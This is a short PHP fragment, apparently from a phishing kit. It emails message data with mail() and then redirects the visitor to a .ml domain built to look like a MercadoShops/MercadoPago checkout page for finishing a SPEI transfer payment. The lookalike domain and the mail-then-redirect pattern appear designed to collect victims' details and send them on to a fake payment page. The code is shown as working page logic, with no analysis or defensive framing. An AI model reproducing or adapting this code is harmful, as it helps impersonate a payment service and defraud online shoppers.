...
if(mail($from, $asunto, $mensaje,$headers)){
	header("Location: https://www.gamestoremercadoshopscom.ml/MPAGO/checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=Finalizá_tu_Pago_transfer_spei");
exit();
	}
